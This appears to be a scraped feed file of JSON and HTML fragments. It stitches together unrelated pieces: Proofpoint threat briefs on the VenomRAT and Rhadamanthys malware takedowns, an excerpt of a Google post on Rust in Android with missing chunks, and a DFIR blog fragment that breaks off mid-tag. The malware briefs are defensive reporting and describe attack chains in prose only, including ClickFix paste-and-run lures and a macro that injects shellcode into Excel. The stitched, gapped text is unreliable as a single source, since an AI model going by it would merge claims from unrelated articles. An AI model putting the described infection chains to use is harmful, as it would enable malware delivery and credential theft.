      "link": "https://www.proofpoint.com/us/blog/threat-insight/security-brief-venomrat-defanged",
      "summary": "What happened&nbsp;\n\nVenomRAT is a commodity remote access trojan (RAT) used by multiple cybercriminal threat actors. Around since 2020 but first observed in Proofpoint data in 2022, VenomRAT was used most frequently by the hotel and hospitality targeting threat actor TA558. The malware is based on the open-source malware Quasar RAT. VenomRAT is essentially a clone of Quasar RAT with some extra components bolted on from other sources.&nbsp;\n\nVenomRAT can be used for information gathering, exfiltration, lateral movement, and to download follow-on payloads. Some VenomRAT variants contain ransomware functionality.&nbsp;&nbsp;\n\nOn 13 November 2025, U.S. and international law enforcement announced the disruption of VenomRAT infrastructure and the arrest of the malware\u2019s creator as part of ongoing Operation Endgame efforts. Both the malware advertising and distribution domain (remotesystem[.]in) and the licensing domain (venomlicense[.]com) were taken down as part of the operation. The main VenomRAT suspect was arrested in Greece.\n\n\n\nFigure 1. Screenshot of seized distribution domain.&nbsp;&nbsp;\n\nCampaign details&nbsp;\n\nProofpoint frequently observes VenomRAT in email campaign data, with its prominence increasing among both unattributed threat actors and tracked TAs from mid-2024 through summer 2025.&nbsp;&nbsp;\n\n\n\nFigure 2. VenomRAT campaigns observed over time.&nbsp;&nbsp;\n\nThe most prominent actor distributing VenomRAT is TA558. Tracked by Proofpoint since 2018, TA558\u2019s targeting focus is mainly on Portuguese and Spanish speakers, typically located in the Latin America region, with additional targeting observed in Western Europe and North America. While the actor favors VenomRAT, TA558 also distributes other commodity malware including njRAT, Remcos RAT, and recently XWorm and PDQ Connect.&nbsp;&nbsp;\n\nTA558 activity accounts for 58% of the amount of VenomRAT observed in Proofpoint email campaign data since 2022.&nbsp;\n\n&nbsp;&nbsp;\n\nFigure 3. Distribution of VenomRAT by threat actor.&nbsp;&nbsp;\n\nTA558 VenomRAT campaigns typically include 1,000 messages or less with lures in Portuguese, Spanish, and occasionally English. In recent campaigns, messages contained URLs leading to a JavaScript file. If executed, the file spawned PowerShell to download and run VenomRAT.&nbsp;\n\n\n\nFigure 4. TA558 lure impersonating a complaints website, August 2025.&nbsp;&nbsp;\n\nThe number of unattributed threat clusters using VenomRAT increased in 2024, but another prominent threat actor occasionally included the malware in its arsenal: TA2541.&nbsp; This actor impersonates aviation firms to distribute malware to firms globally, most frequently in North America and Europe. Campaigns typically include less than 1,000 messages and follow a similar attack chain to TA558, with URLs leading to JavaScript files that, if executed, download and run malware.&nbsp;\n\n\n\nFigure 5. TA2541 lure impersonating an aviation charter company, April 2025.&nbsp;\n\nImpact&nbsp;\n\nThe disruption to VenomRAT will cause threat actors using the malware to pivot to new payloads. Proofpoint has not observed VenomRAT in campaign data since September 2025, and TA558 has already begun favoring other malware including Remcos RAT and XWorm, with lower volumes of activity since October.&nbsp;&nbsp;\n\nWith every law enforcement action, especially those associated with Operation Endgame, Proofpoint observes notable behavior shifts among actors that use email as a first stage malware delivery method. Disruptions often have psychological impacts alongside financial and technological ones. In this case, in addition to pivoting to other payloads, it is possible the threat actors who used VenomRAT may become more wary and mistrustful of malware providers or even concerned about their own activities being monitored by law enforcement. An arrest will also prevent the malware author from developing and selling new tools in the future.&nbsp;&nbsp;\n\nOperation Endgame is a widespread effort conducted by global law enforcement and private sector partners, including Proofpoint, to disrupt malware and botnet infrastructure and identify the alleged individuals associated with the activity. In May 2024, the first Operation Endgame disruption effort targeted multiple malware families including IcedID, Bumblebee, SystemBC, Pikabot, SmokeLoader, and more, and Europol called it the \u201clargest ever operation against botnets, which play a major role in the deployment of ransomware.\u201d The second major Operation Endgame action occurred in May 2025 and targeted additional malware families and their creators, including DanaBot, WarmCookie, Trickbot, and Hijack Loader. The major malware-as-a-service Lumma Stealer has also been targeted by law enforcement.&nbsp;&nbsp;\n\nOperation Endgame disruptions have significantly affected the overall email threat landscape, specifically disrupting activity attributed to known initial access broker payloads (IABs) and supporting malware families delivered via email-based campaigns. For example, in February 2023, 17% of email malware campaigns in Proofpoint data were associated with malware targeted by Operation Endgame, while that number had dropped to 1% by September 2025.&nbsp;\n\nProofpoint\u2019s mission is to provide the best human-centric protection for our customers against advanced threats. Whenever it is possible and appropriate to do so, and as is the case with Operation Endgame, Proofpoint uses its team\u2019s knowledge and skills to help protect a wider audience against widespread malware threats. Proofpoint was proud to assist in the law enforcement investigations into VenomRAT activity.&nbsp;",

With Rust changes having <strong>a 4x lower rollback rate</strong> and spending <strong>25% less time in code review</strong>, the safer path is now also the faster one. \n</p>\n<p>\nIn this post, we dig into the data behind this shift and also cover:\n</p>\n<ul>\n\n<li><strong>How we\u2019re expanding our reach:</strong> We're pushing to make secure code the default across our entire software stack. We have updates on Rust adoption in first-party apps, the Linux kernel, and firmware.</li>\n\n<li><strong>Our first rust memory safety vulnerability...almost:</strong> We'll analyze a near-miss memory safety bug in unsafe Rust: how it happened, how it was mitigated, and steps we're taking to prevent recurrence. It\u2019s also a good chance to answer the question \u201cif Rust can have memory safety issues, why bother at all?\u201d</li>\n</ul>\n<h1>Building Better Software, Faster</h1>\n\n\n<p>\nDeveloping an operating system requires the low-level control and predictability of systems programming languages like C, C++, and Rust. While Java and Kotlin are important for Android platform development, their role is complementary to the systems languages rather than interchangeable. <a href=\"https://security.googleblog.com/2021/04/rust-in-android-platform.html\">We introduced Rust into Android</a> as a direct alternative to C and C++, offering a similar level of control but without many of their risks. We focus this analysis on new and actively developed code because our data shows this to be <a href=\"https://security.googleblog.com/2024/09/eliminating-memory-safety-vulnerabilities-Android.html\">an effective approach</a>.\n</p>\n<p>\nWhen we look at development in systems languages (excluding Java and Kotlin), two trends emerge: a steep rise in Rust usage and a slower but steady decline in new C++.\n</p>\n<div class=\"separator\" style=\"clear: both;\"><a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-MWhK4zEb7DBnAO8eF3DRxQ-T7p_LCkl7qApGBxda2fiHroOHwMQYlIfYHsZLakB6XiyOynkJbTVShIXe5pzqw7VXcZSAzflS7PyzUrM_8ZUVXOgudYo9bmgvhA7CVACfh5OS0wfOHbBczW_poHUfI8lngMWiuLs9Z5I0arQ-Z_e7WBzgSzOCUSHymx7Z/s1600/image1%20%281%29.png\" style=\"display: block; padding: 1em 0; text-align: center;\"><img alt=\"\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-MWhK4zEb7DBnAO8eF3DRxQ-T7p_LCkl7qApGBxda2fiHroOHwMQYlIfYHsZLakB6XiyOynkJbTVShIXe5pzqw7VXcZSAzflS7PyzUrM_8ZUVXOgudYo9bmgvhA7CVACfh5OS0wfOHbBczW_poHUfI8lngMWiuLs9Z5I0arQ-Z_e7WBzgSzOCUSHymx7Z/s1600/image1%20%281%29.png\" /></a></div>\n<p style=\"text-align: center;\">\n<em>Net lines of code added: Rust vs. C++, first-party Android code.<br />This chart focuses on first-party (Google-developed) code (unlike the previous chart that included all first-party and third-party code in Android.)

To measure this, we use the DORA<sup id=\"fnref1\"><a href=\"http://feeds.feedburner.com/GoogleOnlineSecurityBlog#fn1\" rel=\"footnote\">1</a></sup> framework, a decade-long research program that has become the industry standard for evaluating software engineering team performance. <a href=\"https://dora.dev/guides/dora-metrics-four-keys/\">DORA metrics</a> focus on:\n</p>\n<ul>\n\n<li>Throughput: the velocity of delivering software changes.</li>\n\n<li>Stability: the quality of those changes.</li>\n</ul>\n<p>\nCross-language comparisons can be challenging. We use several techniques to ensure the comparisons are reliable.\n</p>\n<ul>\n\n<li>Similar sized changes: Rust and C++ have similar functionality density, though Rust is slightly denser. This difference favors C++, but the comparison is still valid. We use <a href=\"https://issues.gerritcodereview.com/issues/40007892\">Gerrit\u2019s change size definitions</a>.</li>\n\n<li>Similar developer pools: We only consider first-party changes from Android platform developers.

Rollbacks are highly disruptive to productivity, introducing organizational friction and mobilizing resources far beyond the developer who submitted the faulty change. Rollbacks necessitate rework and more code reviews, can also lead to build respins, postmortems, and blockage of other teams. Resulting postmortems often introduce new safeguards that add even more development overhead.</p>\n<p>\nIn a <a href=\"https://opensource.googleblog.com/2023/06/rust-fact-vs-fiction-5-insights-from-googles-rust-journey-2022.html\">self-reported survey from 2022</a>, Google software engineers reported that Rust is both easier to review and more likely to be correct. The hard data on rollback rates and review times validates those impressions.\n</p>\n<h2>Putting it all together</h2>\n\n\n<p>\nHistorically, security improvements often came at a cost. More security meant more process, slower performance, or delayed features, forcing trade-offs between security and other product goals. The shift to Rust is different: we are significantly improving security <em>and</em> key development efficiency and product stability metrics. \n</p>\n<h1>Expanding Our Reach</h1>\n\n\n<p>\nWith Rust support now mature for building Android system services and libraries, we are focused on bringing its security and productivity advantages elsewhere. \n</p>\n<ul>\n\n<li><strong>Kernel:</strong> Android\u2019s 6.12 Linux kernel is our first kernel with Rust support enabled and our first production Rust driver. More exciting projects are underway, such as our ongoing <a href=\"https://www.collabora.com/news-and-blog/news-and-events/introducing-tyr-a-new-rust-drm-driver.html\">collaboration with Arm and Collabora on a Rust-based kernel-mode GPU driver</a>.</li>\n\n<li><strong>Firmware:</strong> The combination of high privilege, performance constraints, and limited applicability of many security measures makes firmware both high-risk, and challenging to secure. Moving firmware to Rust can yield a major improvement in security. We have been <a href=\"https://security.googleblog.com/2023/10/bare-metal-rust-in-android.html\">deploying Rust in firmware for years now</a>, and even released <a href=\"https://security.googleblog.com/2024/09/deploying-rust-in-existing-firmware.html\">tutorials</a>, <a href=\"https://google.github.io/comprehensive-rust/bare-metal.html\">training</a>, and <a href=\"https://github.com/google/aarch64-rt\">code</a> for the wider community. We\u2019re particularly excited about our <a href=\"https://www.trustedfirmware.org/blog/rf-a-blog\">collaboration with Arm on Rusted Firmware-A</a>.</li>\n\n<li><strong>First-party applications:</strong> Rust is ensuring memory safety from the ground up in several security-critical Google applications, such as:</li> \n<ul>\n \n<li><a href=\"https://developers.google.com/nearby\">Nearby Presence</a>: The protocol for securely and privately discovering local devices over Bluetooth is implemented in Rust and is currently running in Google Play Services.</li>\n \n<li><a href=\"https://www.gsma.com/newsroom/article/rcs-encryption-a-leap-towards-secure-and-interoperable-messaging/\">MLS</a>: The protocol for secure RCS messaging is implemented in Rust and will be included in the Google Messages app in a future release.</li>\n \n<li>Chromium: Parsers for <a href=\"https://chromium-review.googlesource.com/c/chromium/src/+/6085801\">PNG</a>, <a href=\"https://crbug.com/40276029\">JSON</a>, and <a href=\"https://developer.chrome.com/blog/memory-safety-fonts\">web fonts</a> have been replaced with memory-safe implementations in Rust, making it easier for Chromium engineers to deal with data from the web while following the <a href=\"https://chromium.googlesource.com/chromium/src/+/main/docs/security/rule-of-2.md\">Rule of 2</a>.</li> \n</ul></li> \n</ul>\n<p>\n<br />These examples highlight Rust's role in reducing security risks, but <strong>memory-safe languages are only one part of a comprehensive memory safety strategy</strong>. We continue to employ a defense-in-depth approach, the value of which was clearly demonstrated in a recent near-miss.\n</p>\n<h1>Our First Rust Memory Safety Vulnerability...Almost</h1>\n\n\n<p>\nWe recently avoided shipping our very first Rust-based memory safety vulnerability: a linear buffer overflow in <a href=\"https://android.googlesource.com/platform/external/rust/crabbyavif/\">CrabbyAVIF</a>. It was a near-miss. To ensure <a href=\"https://android.googlesource.com/platform/external/rust/crabbyavif/+/5262cd9befecb4f8865925c23eb543f19967e050\">the patch</a> received high priority and was tracked through release channels, we assigned it the identifier <a href=\"https://source.android.com/docs/security/bulletin/2025-08-01\">CVE-2025-48530</a>. While it\u2019s great that <strong>the vulnerability never made it into a public release</strong>, the near-miss offers valuable lessons. The following sections highlight key takeaways from our postmortem.\n</p>\n<h2>Scudo Hardened Allocator for the Win</h2>\n\n\n<p>\nA key finding is that <strong>Android\u2019s Scudo hardened allocator deterministically rendered this vulnerability non-exploitable</strong> <a href=\"https://llvm.org/docs/ScudoHardenedAllocator.html\">due to guard pages surrounding secondary allocations</a>. While Scudo is Android\u2019s default allocator, used on Google Pixel and many other devices, we continue to work with partners to make it mandatory. In the meantime, we will issue CVEs of sufficient severity for vulnerabilities that could be prevented by Scudo.\n</p>\n<p>\nIn addition to protecting against overflows, Scudo\u2019s use of guard pages helped identify this issue by changing an overflow from silent memory corruption into a noisy crash. However, we did discover a gap in our crash reporting: it failed to clearly show that the crash was a result of an overflow, which slowed down triage and response. This has been fixed, and we now have a clear signal when overflows occur into Scudo guard pages.\n</p>\n<h2>Unsafe Review and Training</h2>\n\n\n<p>\nOperating system development requires unsafe code, typically C, C++, or unsafe Rust  (for example, for FFI and interacting with hardware), so simply banning unsafe code is not workable. When developers must use unsafe, they should understand how to do so soundly and responsibly\n</p>\n<p>\nTo that end, we are adding a new deep dive on unsafe code to our <a href=\"https://google.github.io/comprehensive-rust/\">Comprehensive Rust training</a>. This new module, currently in development, aims to teach developers how to reason about unsafe Rust code, soundness and undefined behavior, as well as best practices like safety comments and encapsulating unsafe code in safe abstractions.\n</p>\n<p>\nBetter understanding of unsafe Rust will lead to even higher quality and more secure code across the open source software ecosystem and within Android. As we'll discuss in the next section, our unsafe Rust is already really quite safe. It\u2019s exciting to consider just how high the bar can go.\n</p>\n<h1>Comparing Vulnerability Densities</h1>\n\n\n<p>\nThis near-miss inevitably raises the question: \"If Rust can have memory safety vulnerabilities, then what\u2019s the point?\"\n</p>\n<p>\nThe point is that the density is drastically lower. So much lower that it represents a major shift in security posture. Based on our near-miss, we can make a conservative estimate. With roughly 5 million lines of Rust in the Android platform and one potential memory safety vulnerability found (and fixed pre-release), our estimated vulnerability density for Rust is 0.2 vuln per 1 million lines (MLOC).\n</p>\n<p>\nOur historical data for C and C++ shows a density of closer to 1,000 memory safety vulnerabilities per MLOC. Our Rust code is currently tracking at a density orders of magnitude lower: <strong>a more than 1000x reduction.</strong>\n</p>\n<p>\nMemory safety rightfully receives significant focus because the vulnerability class is uniquely powerful and (historically) highly prevalent. High vulnerability density undermines otherwise solid security design because these flaws can be chained to bypass defenses, including those specifically targeting memory safety exploits. Significantly lowering vulnerability density does not just reduce the number of bugs; it dramatically boosts the effectiveness of our entire security architecture.\n</p>\n<p>\nThe primary security concern regarding Rust generally centers on the approximately 4% of code written within <code>unsafe{}</code> blocks. This subset of Rust has fueled significant speculation, misconceptions, and even theories that <a href=\"https://goto.ucsd.edu/~rjhala/hotos-ffi.pdf\">unsafe Rust might be more buggy than C</a>. Empirical evidence shows this to be quite wrong.\n</p>\n<p>\nOur data indicates that even a more conservative assumption, that a line of unsafe Rust is as likely to have a bug as a line of C or C++, significantly overestimates the risk of unsafe Rust. We don\u2019t know for sure why this is the case, but there are likely several contributing factors:\n</p>\n<ul>\n\n<li>unsafe{} doesn't actually disable all or even most of Rust\u2019s safety checks (a common misconception).</li>\n\n<li>The practice of encapsulation enables local reasoning about safety invariants.</li>\n\n<li>The additional scrutiny that unsafe{} blocks receive.</li>\n</ul>\n<h1>Final Thoughts</h1>\n\n\n<p>\nHistorically, we had to accept a trade-off: mitigating the risks of memory safety defects required substantial investments in static analysis, runtime mitigations, sandboxing, and reactive patching. This approach attempted to move fast and then pick up the pieces afterwards. These layered protections were essential, but they came at a high cost to performance and developer productivity, while still providing insufficient assurance.\n</p>\n<p>\nWhile C and C++ will persist, and both software and hardware safety mechanisms remain critical for layered defense, the transition to Rust is a different approach where the more secure path is also demonstrably more efficient. Instead of moving fast and <em>then</em> later fixing the mess, we can move faster <em>while</em> fixing things. And who knows, as our code gets increasingly safe, perhaps we can start to reclaim even more of that performance and productivity that we exchanged for security, all while also <em>improving</em> security.\n</p>\n<h1>Acknowledgments</h1>\n\n\n<p>\nThank you to the following individuals for their contributions to this post:\n</p>\n<ul>\n\n<li>Ivan Lozano for compiling the detailed postmortem on CVE-2025-48530.</li>\n\n<li>Chris Ferris for validating the postmortem\u2019s findings and improving Scudo\u2019s crash handling as a result.</li>\n\n<li>Dmytro Hrybenko for leading the effort to develop training for unsafe Rust and for providing extensive feedback on this post.</li>\n\n<li>Alex Rebert and Lars Bergstrom for their valuable suggestions and extensive feedback on this post.</li>\n\n<li>Peter Slatala, Matthew Riley, and Marshall Pierce for providing information on some of the places where Rust is being used in Google's apps.</li>\n</ul>\n<p>\nFinally, a tremendous thank you to the Android Rust team, and the entire Android organization for your relentless commitment to engineering excellence and continuous improvement.\n</p>\n\n<!-- Footnotes themselves at the bottom. -->\n\n<h2>Notes</h2>\n<div class=\"footnotes\">\n<hr />\n<ol><li id=\"fn1\">\n<p>\n     The DevOps Research and Assessment (DORA) program is published by Google Cloud.&nbsp;<a href=\"http://feeds.feedburner.com/GoogleOnlineSecurityBlog#fnref1\" rev=\"footnote\">&#8617;</a>\n\n</ol></div>",

      "summary": "Key takeaways&nbsp;\n\n\n\tRhadamanthys is a prominent malware observed since 2022, used by multiple cybercriminal threat actors.&nbsp;\n\tThe malware has been observed delivered via email, web injects, and malvertising campaigns.&nbsp;&nbsp;\n\tIt is a modular information stealer with multiple pricing plans, and the creators sell it alongside Elysium Proxy Bot and a\u202fCrypt Service.&nbsp;&nbsp;\n\tInternational law enforcement disrupted Rhadamanthys and affiliates\u2019 infrastructure as part of ongoing Operation Endgame efforts.&nbsp;\n\n\nOverview&nbsp;\n\nRhadamanthys malware has evolved significantly over time, reflecting ongoing advancements in cybercriminal techniques. First observed in 2022, Rhadamanthys emerged as a sophisticated information stealer, primarily targeting sensitive user data such as login credentials, financial information, and system details. It quickly gained popularity on underground forums, where its capabilities and ease of customization attracted various cybercriminals.&nbsp;\n\nThroughout its development, Rhadamanthys updates include new features, improving its evasion tactics and adaptability. Updates often allow it to avoid detection by security and detection controls more effectively, often through techniques involving obfuscation and anti-analysis. The malware authors introduced multi-stage payloads, which enabled the malware to bypass security layers by spreading across stages in discrete steps. Additionally, it became more modular, allowing threat actors to tailor capabilities to specific attacks or targets.&nbsp;\n\nThe operators sell access to Rhadamanthys for between $300 to $500 a month, with options for a higher price point for customized uses. Notably, some cybercriminal forums banned the sale of Rhadamanthys because it allowed the targeting of Russian and Commonwealth of Independent States countries.&nbsp;&nbsp;\n\nProofpoint observes Rhadamanthys delivered via email campaigns conducted by multiple threat actors. Techniques for payload delivery include leveraging the ClickFix social engineering technique, pairing URLs and aggressive filtering with instructions that advise people to copy, paste, and run PowerShell scripts to infect themselves with malware. Threat actors including TA585, TA2541, TA547, TA571, TA866, and numerous unattributed threat clusters have used Rhadamanthys in campaigns.&nbsp;&nbsp;\n\nProofpoint observed more Rhadamanthys campaigns so far in 2025 than previous years, in part due to more threat actors leveraging compromised websites to deliver malware, including Rhadamanthys. (Analyst note: it is possible there was additional low-volume activity observed in email threat data that was not campaigned by threat researchers.)&nbsp;\n\n\n\nFigure 1. Timeline of Rhadamanthys campaigns.&nbsp;\n\nOperation Endgame&nbsp;\n\nOn 13 November 2025, law enforcement disrupted Rhadamanthys\u2019s infrastructure \u2013 specifically taking down multiple servers associated with the management and operation of the malware \u2013 as well as infrastructure associated with affiliates using the malware. This disruption was part of Operation Endgame, a collaboration between global law enforcement and private sector partners. Additional services like Elysium Proxy Bot were also affected. Notably, law enforcement also posted a video on the operation\u2019s main website that suggested that the threat actor behind Rhadamanthys was not only facilitating information stealer operations but also stealing sensitive data from Rhadamanthys affiliates. In addition to the infrastructure disruption, it\u2019s likely that this operation will also negatively affect the criminals\u2019 reputation, leading affiliates to mistrust them.&nbsp;\n\nOperation Endgame is a widespread effort conducted by global law enforcement and private sector partners, including Proofpoint, to disrupt malware and botnet infrastructure and identify the alleged individuals associated with the activity. In May 2024, the first Operation Endgame disruption effort targeted multiple malware families including IcedID, Bumblebee, SystemBC, Pikabot, SmokeLoader, and more, and Europol called it the \u201clargest ever operation against botnets, which play a major role in the deployment of ransomware.\u201d The second major Operation Endgame action occurred in May 2025 and targeted additional malware families and their creators, including DanaBot, WarmCookie, Trickbot, and Hijack Loader. The major malware-as-a-service Lumma Stealer has also been targeted by law enforcement.&nbsp;&nbsp;\n\nOperation Endgame disruptions have significantly affected the overall email threat landscape, specifically disrupting activity attributed to known initial access broker (IAB) payloads and supporting malware families delivered via email-based campaigns. For example, in March 2023, 17% of email-based malware campaigns in Proofpoint data were associated with malware targeted by Operation Endgame, while that number had dropped to 1% by September 2025.&nbsp;\n\nHistory&nbsp;\n\nWhen Rhadamanthys first emerged in 2022, it was a commercially marketed information-stealer sold via underground forums by the alias \u201ckingcrete2022\u201d. It swiftly evolved from a simple malware to a modular Malware-as-a-Service (MaaS) offering as developers added plugins and staged loader architecture to make analysis and detection harder. Early development ascended into a cadence of rapid releases.&nbsp;&nbsp;\n\nBy 2024, the malware was shipped with a notable update that added AI-driven OCR capabilities to automatically identify and extract cryptocurrency seed phrases from images. This version included new evasion and encryption upgrades. The operator also offered new conveniences for customers that reflected popular trends in the threat landscape, one of which was MSI installer execution to assist in bypassing security detections.&nbsp;\n\nIn late 2024 through 2025, researchers noted an increase in Rhadamanthys campaigns which leveraged the malware\u2019s modularity to tailor to threat actors with different objectives and levels of sophistication. In 2025, the developers pushed a new 0.9.X series that hardened network and packing obfuscation, expanded device and browser fingerprinting, reintroduced PNG steganography for hiding payloads, and adopted marketing changes. These changes included tiered pricing updates, enhanced features, and rebranding. The rebranding was reflected in a modernized site emphasizing a more professional MaaS business model, rapid feature growth, more useful distribution and monetization techniques, and an ecosystem that makes Rhadamanthys a favored malware of choice.&nbsp;\n\nThe takedown and disruption of many prominent loaders and top tier malware by Operation Endgame primed the market for Rhadamanthys to rise. Evidence suggests the malware is maintained and improved by capable developers. New releases have correlated to current and coveted resources and landscape trends, delivered in a way that makes it easy to utilize for customers.&nbsp;&nbsp;\n\n\n\nFigure 2. Priority malware in campaign data and the impact of Operation Endgame.&nbsp;\n\nAffiliations&nbsp;\n\nAs a MaaS, different affiliates may license the malware, attach custom plugins, and run campaigns independently. It is advertised on multiple forums, meaning it is not exclusive to a group of trusted affiliates but is instead available to a larger market. It is notable the creators developed the malware to be used by threat actors with varying expertise. As a result, Rhadamanthys has been observed in campaigns as simple as compressed executables attached to emails, and more sophisticated campaigns using distribution techniques like Google Ads, ClickFix, compromised websites, and priority threat actors\u2019 more targeted campaigns.&nbsp;\n\nThreat actors&nbsp;\n\nProofpoint first began tracking Rhadamanthys in December 2022 when it was distributed in a campaign attributed to priority cybercriminal threat actor TA571 with post exploitation activities attributed to TA866. TA571 has used both exclusive and more freely available malware, but TA866 has historically been observed using more exclusive and distinct malware. The actors\u2019 use of Rhadamanthys immediately designated it as a priority malware to tracked.&nbsp;&nbsp;\n\nProofpoint subsequently observed TA2541, a capable actor classified on a lower tier who favors off-the-shelf RATs, use Rhadamanthys in February 2022. TA547, a priority threat actor who has used sophisticated banking malware and loaders, leveraged Rhadamanthys throughout 2024. TA585, a newly designated actor suspected of operating their entire attack chain through malware delivery, utilized Rhadamanthys frequently in 2025. In addition to the designated threat actors tracked by Proofpoint, the malware has been used in a large number of unattributed activity clusters in Proofpoint data, including the threat actor tracked by third-parties as \u201cAggah\u201d, and by other threat actors tracked externally in distributing malware via other mediums like malvertising or SEO poisoning.&nbsp;&nbsp;\n\nActors across the crimeware spectrum from low-level actors to sophisticated operators using Rhadamanthys consistently over time demonstrates the apparent success of the malware as a product, the malware\u2019s evolution and evasion efforts, and the successful MaaS strategy employed by its operators.&nbsp;\n\nMalware&nbsp;\n\nThreat actors may distribute Rhadamanthys as the sole malware payload, a companion malware delivered with others, or as a follow-on payload. In Proofpoint data, Rhadamanthys is frequently used in campaigns distributed by loaders. For example, we\u2019ve seen the following drop Rhadamanthys as a follow-on payload:&nbsp;\n\n\n\tSystemBC&nbsp;\n\tDarkGate&nbsp;\n\tGuLoader&nbsp;\n\tSmartLoader&nbsp;\n\tResident Backdoor&nbsp;\n\tDoubleLoader&nbsp;\n\tDOILoader / Hijack Loader&nbsp;\n\tLatrodectus&nbsp;\n\tCastleLoader&nbsp;\n\tAmadey&nbsp;\n\n\nProofpoint researchers have also observed Rhadamanthys delivered in campaigns as a companion to other malware, including:\n\n\n\tRemcos&nbsp;\n\tzgRAT&nbsp;\n\tScreenshotter / AHK Bot&nbsp;&nbsp;\n\tBitRAT&nbsp;\n\tXWorm&nbsp;\n\tLumma&nbsp;\n\tXLoader&nbsp;\n\n\nIn these campaigns, Rhadamanthys is either delivered at the same time as other payloads, or is distributed to a limited target set within a broader campaign that drops multiple payloads to different recipients.&nbsp;&nbsp;\n\nRecent attack chains&nbsp;\n\nRhadamanthys is currently distributed by multiple threat actors using many different attack chains to deliver malware. The following are a small sample of some of the most interesting campaigns Proofpoint researchers observed in recent months.&nbsp;&nbsp;\n\nCompromised websites&nbsp;\n\nMultiple threat clusters use compromised websites to distribute Rhadamanthys. In email data, we observe these messages because they contain links to compromised websites. Although neither the sender nor the site owner may intend harm, the websites have been compromised with a malicious injection.&nbsp;&nbsp;\n\nIn a campaign observed in October 2025, the injection prompted the website to load a malicious script which was hosted on actor-operated infrastructure, which, in turn loaded a counterfeit Cloudflare turnstile. Upon validation the browser switched to full screen and display a fake security update lure.&nbsp;\n\n\n\nFigure 3. Cloudflare verification.&nbsp;\n\n\n\nFigure 4. Fake update ClickFix instructions.&nbsp;\n\nThis attack chain used a technique called \"Clickfix\" which instructs the user to copy and paste a malicious command in the run box. In this way, the attacker is essentially tricking the user to infect themselves with malware. Many web inject campaigns use this technique. In this case, if the command was run, it would lead to the installation of Rhadamanthys.&nbsp;\n\nURLs&nbsp;\n\nRhadamanthys payload delivery via URLs in emails is also common. For example, Proofpoint identified a campaign in October impersonating a logistics company. Messages contained URLs leading to a website instructing the recipient to sign a form and click \u201csubmit\u201d. Then, the user would be redirected to a ClickFix landing page.&nbsp;&nbsp;\n\n\n\nFigure 5. Impersonated company landing page with a fake confirmation.&nbsp;\n\n\n\nFigure 6. ClickFix instructions.&nbsp;\n\nIf the target completed the ClickFix steps as instructed, a command was initiated to download a tar archive and run CastleLoader. CastleLoader was observed loading DOILoader and Rhadamanthys. DOILoader was observed loading zgRAT.&nbsp;&nbsp;\n\nThis campaign aligns with an increase in threat actors targeting the surface transportation industry to deliver malware or remote monitoring and management (RMM) tools. &nbsp;\n\nPDFs&nbsp;\n\nAnother interesting campaign in August and September impersonated YouTube and targeted organizations in the entertainment and media industries. The messages contained a PDF with a link to a fake \"Youtube DMCA\" themed website built with Lovable App and used the ClickFix technique.&nbsp;&nbsp;\n\n\n\nFigure 7. Fake YouTube \u201ccopyright appeal\u201d website created by threat actors.&nbsp;\n\nThe app instructed recipients to enter their YouTube URL, retrieved real-time metadata for any submitted YouTube channel, and claimed that an appeal is needed. If the instructions were followed and the user copied and pasted the PowerShell script as directed, it executed an HTA script. The HTA enabled VBA macros via registry changes and built an Excel workbook via COM in-memory, opening it silently without user interaction. The workbook contained an AutoOpen macro, which the HTA constructed from split Base64 strings. This macro downloaded a .bin file containing shellcode and executed it via classic shellcode injection using VirtualAlloc + RtlMoveMemory + CreateThread into the Excel process to run Rhadamanthys in memory. While the macro included logic for both 32- and 64-bit Office, it only downloaded and ran 64-bit shellcode, so it crashed on 32-bit Excel.&nbsp;\n\nThe payload chain from HTA to shellcode execution was likely built with the commercial toolkit MacroPack Pro which is sold to red teams and \"ethical hackers\".&nbsp;\n\nImpact&nbsp;\n\nIn general, disruptions to cybercrime threat actors and their malware have ripple effects across the ecosystem. Threat actors who rely on Rhadamanthys will have to find a new malware for distribution and spend time and money retooling their attack chains. It is possible that threat actors may pivot to newer malware such as Amatera Stealer, Monster V2, or CastleRAT. But while there may be other options tooling-wise, disruptions also sow distrust among the criminal ecosystem, and in some cases, lead to more restrictive policies and tighter controls about who can buy malware from certain brokers.&nbsp;&nbsp;\n\nProofpoint will continue to monitor where Rhadamanthys threat actors go next and continue defending against cybercriminal threats.&nbsp;&nbsp;\n\nConclusion&nbsp;\n\nAs law enforcement disruptions continue to alter threat actors\u2019 behavior, it\u2019s important to be aware of emerging trends and behaviors from prominent cybercriminal threat actors, such as the use of\u202fremote monitoring and management\u202fsoftware (RMMs), increase in use of\u202finformation stealers, and\u202fnew social engineering techniques\u202fthat target people not technology. By understanding the landscape, organizations can implement defenses against emerging trends and anticipate what decisions threat actors will make to stay ahead of them.&nbsp;\n\nProofpoint\u2019s mission is to provide the best human-centric protection for our customers against advanced threats. Whenever it is possible and appropriate to do so, and as is the case with Operation Endgame, Proofpoint uses its team\u2019s knowledge and skills to help protect a wider audience against widespread malware threats. Proofpoint was proud to assist in the law enforcement investigations into Rhadamanthys activity.&nbsp;\n\nThrough its unique vantage point, Proofpoint is able to identify the largest and most consequential malware distribution campaigns, providing the authorities with much-needed insight into the biggest threats to society, affecting the greatest number of people around the world.&nbsp;\n\nProofpoint Threat Research would like to thank Pim Trouerbach for his collaboration on investigations into Rhadamanthys and related malware.&nbsp;\n\nEmerging Threats

Some were images posted as examples of techniques, others were posted by professors running courses, and some were from CTFs. If you have read the book, you'll know that for each of the images, I either used or made a more \"real world\" scenario, something that aligned much more closely to my experiences over two and a half decades of DF/IR work, a good bit of which was consulting. During that time, and at several different companies, we'd have an \"IR hotline\" folks could call, and request computer incident response...this is something many firms continue to do. Those firms also very often had \"intake forms\", documents an analyst would fill out with pertinent information from a caller or customer, which very often included investigative goals.&nbsp;<div><br /></div><div>Over the years, the sites from which I downloaded some of the images I used have disappeared, which is unfortunate, but not a deal killer. The intent and value of the book isn't about the images, but rather, about the process. The processes used, even those where an image of a Windows XP system was used, can be replicated, developed, and extended for any Windows OS.&nbsp;</div><div><br /></div><div>Brett Shavers recently<a href=\"https://www.linkedin.com/feed/update/urn:li:activity:7387347352086306816/\"> posted on LinkedIn</a>, pointing the<a href=\"https://www.dfir.training/downloads/test-images?category[0]=11&amp;category_children=1\"> repository of available images</a> he's compiled at <a href=\"https://www.dfir.training/\">DFIR.Training</a>.<br /><p>Over at <a href=\"https://www.stark4n6.com/\">Stark4N6</a>, we see another<a 